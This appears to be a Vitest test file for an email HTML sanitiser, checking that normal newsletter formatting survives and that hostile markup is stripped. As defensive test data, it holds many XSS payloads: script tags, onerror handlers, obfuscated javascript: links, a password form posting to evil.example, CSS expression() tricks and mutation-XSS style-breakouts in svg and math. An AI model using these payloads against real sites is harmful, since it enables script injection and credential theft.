import { describe, expect, test } from 'vitest';
import { BodyTooComplexError, MAX_DEPTH, RAW_MAX, emailBodies, limitNesting, htmlToText, sanitizeEmailHtml, textToHtml } from '../src/mail/html';

const clean = (html: string) => sanitizeEmailHtml(html);

describe('sanitizeEmailHtml: normal email formatting stays', () => {
  test('text, links, lists, tables, images and safe inline styles', () => {
    const html = clean(`
      <p style="color:#333;font-family:Arial,sans-serif;margin:0 0 12px">Hello <b>Ana</b>, <i>thanks</i> <u>a lot</u>.</p>
      <ul><li>One</li><li>Two</li></ul><ol><li>First</li></ol>
      <table width="600" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse" bgcolor="#ffffff">
        <tr><td align="center" valign="top" colspan="2" style="padding:8px;background-color:#f4f4f4">Cell</td></tr>
      </table>
      <img src="https://cdn.example.com/logo.png" alt="Logo" width="120" height="40" style="display:block;border:0">
      <font face="Calibri" color="#1f497d" size="2">Signature</font><center>Centred</center>
      <blockquote>Quoted</blockquote><a href="https://example.com/offer">Offer</a> <a href="mailto:ana@acme.com">Mail</a>`);
    expect(html).toContain('<b>Ana</b>');
    expect(html).toContain('color:#333');
    expect(html).toContain('<li>One</li>');
    expect(html).toContain('<td align="center" valign="top" colspan="2" style="padding:8px;background-color:#f4f4f4">Cell</td>');
    expect(html).toContain('cellpadding="0"');
    expect(html).toContain('bgcolor="#ffffff"');
    expect(html).toContain('src="https://cdn.example.com/logo.png"');
    expect(html).toContain('<font face="Calibri" color="#1f497d" size="2">Signature</font>');
    expect(html).toContain('<center>Centred</center>');
    expect(html).toContain('<blockquote>Quoted</blockquote>');
    expect(html).toContain('href="mailto:ana@acme.com"');
  });

  test('links open in a new tab with rel="noopener noreferrer"', () => {
    const html = clean('<a href="https://example.com" target="_self" rel="opener">Go</a>');
    expect(html).toBe('<a href="https://example.com" target="_blank" rel="noopener noreferrer">Go</a>');
  });

  test('a <style> block from the head is kept (newsletters style by class); title, meta and head text are not', () => {
    const html = clean(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Weekly news</title>
      <style>.btn{background:#0a66c2;color:#fff} @media (max-width:600px){.col{width:100%!important}}</style></head>
      <body><a class="btn" href="https://example.com">Read</a></body></html>`);
    expect(html).toContain('<style>');
    expect(html).toContain('.btn{background:#0a66c2;color:#fff}');
    expect(html).toContain('@media (max-width:600px)');
    expect(html).toContain('class="btn"');
    expect(html).not.toContain('Weekly news');
    expect(html).not.toMatch(/<meta|<html|<head|<body|<!DOCTYPE/i);
  });

  test('data: images are kept', () => {
    expect(clean('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">')).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });
});

describe('sanitizeEmailHtml: XSS vectors are removed', () => {
  test('<script> and its content', () => {
    const html = clean('<p>Hi</p><script>alert(1)</script><SCRIPT src="https://evil.example/x.js"></SCRIPT>');
    expect(html).toBe('<p>Hi</p>');
  });

  test('on* event handlers', () => {
    const html = clean('<img src="https://x.example/a.png" onerror="alert(1)"><div onclick="alert(2)" onmouseover="x()">Text</div><body onload="alert(3)">');
    expect(html).not.toMatch(/on(error|click|mouseover|load)/i);
    expect(html).toContain('<div>Text</div>');
  });

  test('javascript:, vbscript: and data: links (also obfuscated)', () => {
    for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)', '&#106;avascript:alert(1)', 'vbscript:msgbox(1)', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==']) {
      const html = clean(`<a href="${href}">Click</a>`);
      expect(html, href).not.toMatch(/href=/i);
      expect(html).toContain('Click');
    }
  });

  test('iframe, object, embed, form and its controls', () => {
    const html = clean(`<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x.swf">
      <form action="https://evil.example/steal" method="post"><input name="password" type="password"><button formaction="javascript:alert(1)">Go</button>
      <select><option>Secret option</option></select><textarea>typed</textarea></form><p>After</p>`);
    expect(html).not.toMatch(/<(iframe|object|embed|form|input|button|select|option|textarea)\b/i);
    expect(html).not.toMatch(/evil\.example|Secret option|typed/);
    expect(html).toContain('<p>After</p>');
  });

  test('meta refresh, base and link tags', () => {
    const html = clean('<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css"><p>Body</p>');
    expect(html).toBe('<p>Body</p>');
  });

  test('CSS expression(), url(javascript:), behavior, -moz-binding and @import in style attributes and blocks', () => {
    const attr = clean(`<div style="color:red;width:expression(alert(1));background:url(javascript:alert(2));behavior:url(x.htc);-moz-binding:url(x.xml#y)">A</div>
      <div style="background-image:url('https://cdn.example.com/bg.png');padding:4px">B</div><div style="w\\idth:expr\\65 ssion(alert(1))">C</div>`);
    expect(attr).not.toMatch(/expression|javascript|behavior|binding/i);
    expect(attr).toContain('color:red');
    expect(attr).toContain("background-image:url('https://cdn.example.com/bg.png')");
    expect(attr).toContain('padding:4px');
    expect(attr).not.toMatch(/\\/);
    const block = clean(`<style>@import url(https://evil.example/x.css); .a{color:blue;width:expression(alert(1))} .b{background:url("javascript:alert(1)")} .c{behavior:url(x.htc)}</style><p class="a">x</p>`);
    expect(block).not.toMatch(/@import|expression|javascript|behavior/i);
    expect(block).toContain('color:blue');
  });

  test('a style block cannot close itself to smuggle markup', () => {
    const html = clean('<style>.a{color:red}</style ><img src=x onerror=alert(1)><style>.b{}</style>');
    expect(html).not.toMatch(/onerror/i);
  });

  test('svg with script, and svg event handlers', () => {
    const html = clean('<svg onload="alert(1)"><script>alert(2)</script><a xlink:href="javascript:alert(3)"><text>svg text</text></a></svg><p>ok</p>');
    expect(html).not.toMatch(/<svg|<script|alert|xlink/i);
    expect(html).toContain('<p>ok</p>');
  });

  test('data: URLs other than images are dropped; an image with no usable source is dropped (cid: inline images hidden)', () => {
    expect(clean('<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">')).toBe('');
    expect(clean('<img src="data:image/svg+xml;base64,PHN2Zz4=" alt="x">')).toContain('data:image/svg+xml');
    expect(clean('<img src="cid:image001.png@01DA" alt="Logo">')).toBe('');
    expect(clean('<img src="javascript:alert(1)">')).toBe('');
    expect(clean('<a href="data:image/png;base64,AAAA">x</a>')).toBe('<a target="_blank" rel="noopener noreferrer">x</a>');
  });
});

describe('sanitizeEmailHtml: security review fixes (24 Nov 2026)', () => {
  /** Nothing in the output may open a tag the browser would run or follow. */
  const safe = (html: string) => {
    expect(html).not.toMatch(/onerror|onload|<img[^>]*src=x|<meta|http-equiv|javascript:|<svg|<math|<template/i);
  };

  test('I1: <style> inside svg / math / foreign content cannot smuggle markup out (reviewer payloads)', () => {
    for (const payload of [
      '<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>',
      '<math><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></math>',
      '<svg><p><style>&lt;/style&gt;&lt;img src=x onerror=1&gt;</style></p></svg>',
      '<template><style>&lt;/style&gt;&lt;b&gt;</style></template>',
      '<svg><foreignObject><style>&lt;/style&gt;&lt;img onerror=1 src=x&gt;</style></foreignObject></svg>',
      '<svg><style>&lt;/style&gt;&lt;meta http-equiv=refresh content="0;url=https://evil"&gt;&lt;a href="javascript:alert(1)"&gt;x&lt;/a&gt;</style></svg>',
      '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
      '<style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style>',
    ]) {
      const out = clean(payload);
      safe(out);
      // Every link that survives is forced to a new tab without an opener.
      for (const a of out.match(/<a\b[^>]*>/gi) ?? []) expect(a, payload).toContain('rel="noopener noreferrer"');
      // Stable: sanitising the output again changes nothing.
      expect(clean(out), payload).toBe(out);
    }
  });

  test('I2: a <style> with attributes loses them and its CSS is filtered like any other', () => {
    expect(clean('<style id=a>@import url(https://evil/x.css); body{background:url(javascript:alert(1))} </style>')).toBe('<style> body{} </style>');
    expect(clean('<style class="q" media="all">x{a:expression(alert(1));color:red}</style>')).toBe('<style>x{color:red}</style>');
    expect(clean('<STYLE title="t">x{background:url(javascript:1)}</STYLE>')).toBe('<style>x{}</style>');
  });

  test('M2: only static / relative positioning stays; fixed, sticky, absolute and z-index go (inline and <style>)', () => {
    const out = clean('<div style="position:fixed;inset:0;color:red">PHISH</div><p style="position:-webkit-sticky;top:0">s</p>'
      + '<div style="position:absolute;z-index:99;width:100%">A</div><div style="position: static">B</div>'
      + '<style>.x{position: sticky;top:0}.y{position:relative}.z{position:ABSOLUTE;z-index:5;color:blue}.w{position:relative !important}</style>');
    expect(out).not.toMatch(/fixed|sticky|absolute|z-index/i);
    expect(out).toContain('color:red');
    expect(out).toContain('position:static');
    expect(out).toContain('.y{position:relative}');
    expect(out).toContain('.z{color:blue}');
    expect(out).toContain('position:relative !important');
  });

  test('N2: a declaration with an entity goes whole (no half string left to swallow the next rules)', () => {
    expect(clean('<style>x{content:"&lt;/style&gt;"}y{color:red}</style>')).toBe('<style>x{}y{color:red}</style>');
    expect(clean('<style>x{font-family:"a&#x3c;b";color:blue}</style>')).toBe('<style>x{color:blue}</style>');
  });
});

describe('size and speed (C1; deep nesting is bounded by the worker, see mailBodies.test.ts)', () => {
  test('wide (not deep) bodies are fast: a 260 KB newsletter, 20k divs, <pre> with 100k spaces, 50k newlines + divs', () => {
    const started = performance.now();
    for (const content of [
      '<table>' + '<tr><td style="color:red">cell &amp; text</td></tr>'.repeat(5000) + '</table>',
      '<div>x</div>'.repeat(20000),
      '<pre>' + ' '.repeat(100000) + 'x</pre><div>a</div>',
      '\n'.repeat(50000) + '<div>a</div>'.repeat(2000),
    ]) {
      const b = emailBodies({ contentType: 'html', content }, 50_000);
      expect(b.bodyHtml!.length).toBeLessThanOrEqual(50_000);
    }
    expect(performance.now() - started).toBeLessThan(1000);
  });

  test('htmlToText reads whitespace- and block-heavy input in one pass', () => {
    const started = performance.now();
    expect(htmlToText('<pre>' + ' '.repeat(100000) + 'x</pre><div>a</div>')).toBe('x\na');
    expect(htmlToText('<div>x</div>'.repeat(20000)).split('\n')).toHaveLength(20000);
    expect(performance.now() - started).toBeLessThan(500);
  });

  test('limitNesting (htmlparser2\'s own reading): elements past MAX_DEPTH are left out, their text kept', () => {
    expect(MAX_DEPTH).toBe(256);
    const deep = limitNesting('<div>'.repeat(300) + 'x' + '</div>'.repeat(300));
    expect(deep.match(/<div>/g)).toHaveLength(256);
    expect(deep.match(/<\/div>/g)).toHaveLength(256);
    expect(deep).toContain('x');
    // As htmlparser2 reads them: <div/> opens a div, a <p> closes only an open <p> on top, quotes only in values.
    expect(limitNesting('<div/>'.repeat(300) + 'x').match(/<div>/g)).toHaveLength(256);
    expect(limitNesting('<b><p>'.repeat(200) + 'x').match(/<(b|p)>/g)).toHaveLength(256);
    // Ordinary HTML keeps every element, attribute and entity; comments go.
    expect(limitNesting('<!-- c --><table><tr><td a=">" b=\'q"\'>1<td>2<tr><td>3 &amp; 4</table><br><img src="a.png">'))
      .toBe('<table><tr><td a=">" b="q&quot;">1</td><td>2</td></tr><tr><td>3 &amp; 4</td></tr></table><br><img src="a.png">');
    const rows = '<table>' + '<tr><td>a<td>b'.repeat(2000) + '</table>';
    expect(limitNesting(rows).match(/<td>/g)).toHaveLength(4000);
  });

  test('a deadline gives up on reading deep nesting', () => {
    expect(() => emailBodies({ contentType: 'html', content: '<div>'.repeat(50_000) }, 50_000, { deadline: performance.now() })).toThrow(BodyTooComplexError);
  });

  test('the raw body is capped before sanitising and text derivation (an oversized body keeps its start)', () => {
    expect(RAW_MAX).toBe(1_000_000);
    const huge = '<p>start</p>' + '<p>filler words here</p>'.repeat(100000) + '<p>THE-END-MARKER</p>';
    const b = emailBodies({ contentType: 'html', content: huge }, 5_000_000);
    expect(b.bodyHtml!.startsWith('<p>start</p>')).toBe(true);
    expect(b.bodyHtml).not.toContain('THE-END-MARKER');
    expect(b.bodyText).not.toContain('THE-END-MARKER');
    // Cut to RAW_MAX before sanitising; closing the tags the cut left open adds a few characters.
    expect(b.bodyHtml!.length).toBeLessThan(RAW_MAX + 100);
  });
});

describe('htmlToText', () => {
  test('drops style, script, head and title; keeps the words with line breaks; no CSS or markup', () => {
    const text = htmlToText(`<html><head><title>News</title><style>.x{color:red} body{margin:0}</style></head>
      <body><div>Hello&nbsp;<b>Ana</b>,</div><p>Line one<br>Line two</p>
      <table><tr><td>Name</td><td>Price</td></tr><tr><td>Plan</td><td>$10</td></tr></table>
      <script>bad()</script><p>Fish &amp; chips   with    spaces</p></body></html>`);
    expect(text).toBe('Hello Ana,\n\nLine one\nLine two\n\nName Price\nPlan $10\n\nFish & chips with spaces');
    expect(text).not.toMatch(/[{}<>]|color|margin|bad\(\)|News/);
  });

  test('empty or markup-only input gives an empty string', () => {
    expect(htmlToText('')).toBe('');
    expect(htmlToText('<style>p{}</style>')).toBe('');
  });
});

describe('emailBodies', () => {
  test('HTML: sanitised html and the text derived from it, both capped', () => {
    const b = emailBodies({ contentType: 'html', content: '<p>Hi <script>x()</script><b>there</b></p>' }, 50_000);
    expect(b).toEqual({ bodyHtml: '<p>Hi <b>there</b></p>', bodyText: 'Hi there' });
  });

  test('a very long HTML body is cut to the cap and stays well-formed', () => {
    const long = `<div>${'<p>Paragraph text here.</p>'.repeat(5000)}</div>`;
    const b = emailBodies({ contentType: 'html', content: long }, 50_000);
    expect(b.bodyHtml!.length).toBeLessThanOrEqual(50_000);
    expect(b.bodyHtml!.endsWith('</div>')).toBe(true);
    expect(b.bodyText.length).toBeLessThanOrEqual(50_000);
  });

  test('plain text: no html, the text as it is (capped)', () => {
    expect(emailBodies({ contentType: 'text', content: 'Line 1\nLine 2' }, 50_000)).toEqual({ bodyHtml: null, bodyText: 'Line 1\nLine 2' });
    expect(emailBodies({ contentType: 'text', content: 'x'.repeat(60) }, 50).bodyText).toHaveLength(50);
  });
});

test('textToHtml escapes and keeps line breaks', () => {
  expect(textToHtml('Hi <Ana> & "co"\nBye')).toBe('<div>Hi &lt;Ana&gt; &amp; &quot;co&quot;<br>Bye</div>');
});
